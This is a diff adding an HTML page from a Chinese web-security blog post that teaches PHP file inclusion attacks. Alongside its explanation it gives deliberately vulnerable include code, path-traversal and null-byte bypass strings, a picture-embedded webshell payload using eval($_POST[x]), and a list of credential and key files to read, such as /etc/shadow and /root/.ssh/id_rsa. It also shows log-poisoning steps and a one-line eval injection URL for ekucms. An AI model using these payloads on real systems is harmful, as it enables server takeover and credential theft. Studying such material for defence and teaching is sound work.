@@ -1,0 +1,271 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>18php 常见的漏洞 | pony686</title>
+<link rel="shortcut icon" href="https://itxz.fun/favicon.ico?v=1601777037443">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://itxz.fun/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="18php 常见的漏洞 | pony686 - Atom Feed" href="https://itxz.fun/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="01 文件包含漏洞
+文件包含
+程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，
+而无需再次编写，这中文件调用的过程一般被称为文件包含。
+程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://itxz.fun">
+  <img class="avatar" src="https://itxz.fun/images/avatar.png?v=1601777037443" alt="">
+  </a>
+  <h1 class="site-title">
+    pony686
+  </h1>
+  <p class="site-description">
+    pony686
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          python
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://itxz.fun" class="menu" target="_blank">
+          web安全
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              18php 常见的漏洞
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-25
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>01 文件包含漏洞<br>
+文件包含<br>
+程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，<br>
+而无需再次编写，这中文件调用的过程一般被称为文件包含。<br>
+程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，<br>
+但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。<br>
+几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,<br>
+而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。<br>
+在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。<br>
+常见文件包含函数<br>
+include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行<br>
+require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本<br>
+include_once()和require_once()：若文件中代码已被包含则不会再次包含<br>
+程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件<br>
+用户能够控制该动态变量</p>
+<p>漏洞危害<br>
+执行任意代码<br>
+包含恶意文件控制网站<br>
+甚至控制服务器</p>
+<p>漏洞分类<br>
+本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码<br>
+上传图片马，然后包含<br>
+读敏感文件，读PHP文件<br>
+包含日志文件GetShell<br>
+包含/proc/self/envion文件GetShell<br>
+包含data:或php://input等伪协议<br>
+若有phpinfo则可以包含临时文件<br>
+远程文件包含：可以直接执行任意代码<br>
+要保证php.ini中allow_url_fopen和allow_url_include要为On</p>
+<p>漏洞挖掘<br>
+通过白盒代码审计<br>
+黑盒工具挖掘<br>
+awvs appscan burp<br>
+w3af</p>
+<p>本地包含漏洞<br>
+文件包含漏洞利用的条件<br>
+1 include()等函数通过动态变量的方式引入需要包含的文件<br>
+2 用户能控制该动态变量</p>
+<?php 
+$test=$_GET['c'];
+include($test);
+?>
+<p>保存为 include.php<br>
+在同一个目录下创建test.txt 内容为</p>
+<?php phpinfo() ?>
+<p>访问测试  //http://127.0.0.1/test/include.php?c=test.txt    //访问连接，将123.txt传送给c并赋给test变量</p>
+<p>本地包含漏洞注意事项<br>
+相对路径<br>
+../../../etc/passwd<br>
+%00截断包含(PHP&lt;5.3.4)</p>
+<?php
+      include $_GET[x].'.php';
+	  echo $_GET[x].'.php';
+?>
+<p>magic_quotes_gps=off 才可以，否则%00会被转义</p>
+<p>截断绕过<br>
+?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.<br>
+(php版本小于5.2.8(?)可以成功<br>
+?file=../../../../../../../../../boot.ini/………[…]…………<br>
+(php版本小于5.2.8(?)可以成功，只适用windows<br>
+其他绕过<br>
+dvwa中级难度的包含，这个主要是过滤了远程文件包含和我们目录的跳转，大小写混合输入就可以绕过远程文件包含的过滤<br>
+目录跳转的过滤我们可以构造….//….//xxx.php，方式绕过，由于他只过滤一次，我们可以利用他的过滤动态拼接目录跳转，从而绕过过滤</p>
+<p>利用技巧<br>
+上传图片马，马包含的代码为<?fputs(fopen("shell.php","w"),"<?php eval($_POST[x]);?>&quot;)?&gt;，<br>
+上传后图片路径为/uploadfile/x.jpg，当访问<br>
+http://www.cracer.com/xx.php?page=uploadfile/x.jpg时，<br>
+将会在fi这个文件夹下生成shell.php,内容为<?php eval($_POST[x); ?></p>
+<p>读敏感文件<br>
+Windows：<br>
+C:\boot.ini  //查看系统版本<br>
+C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件<br>
+C:\Windows\repair\sam  //存储系统初次安装的密码<br>
+C:\Program Files\mysql\my.ini  //Mysql配置<br>
+C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root<br>
+C:\Windows\php.ini  //php配置信息<br>
+C:\Windows\my.ini  //Mysql配置信息<br>
+Linux：<br>
+/root/.ssh/authorized_keys<br>
+/root/.ssh/id_rsa<br>
+/root/.ssh/id_ras.keystore<br>
+/root/.ssh/known_hosts<br>
+/etc/passwd<br>
+/etc/shadow<br>
+/etc/my.cnf<br>
+/etc/httpd/conf/httpd.conf<br>
+/root/.bash_history<br>
+/root/.mysql_history<br>
+/proc/self/fd/fd[0-9]*(文件标识符)<br>
+/proc/mounts<br>
+/porc/config.gz<br>
+包含日志(主要是得到日志的路径)<br>
+读日志路径：<br>
+文件包含漏洞读取apache配置文件<br>
+index.php?page=/etc/init.d/httpd<br>
+index.php?page=/etc/httpd/conf/httpd.conf<br>
+默认位置/var/log/httpd/access_log</p>
+<p>包含日志(主要是得到日志的路径)<br>
+日志会记录客户端请求及服务器响应的信息，访问http://www.xx.com/<?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent<br>
+可以通过Burp Suite来绕过编码</p>
+<p>文件包含漏洞实例<br>
+制作错误，写入一句话<br>
+http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://itxz.fun/post/xss-lou-dong/">
+              <h3 class="post-title">
+                xss漏洞
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://itxz.fun/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
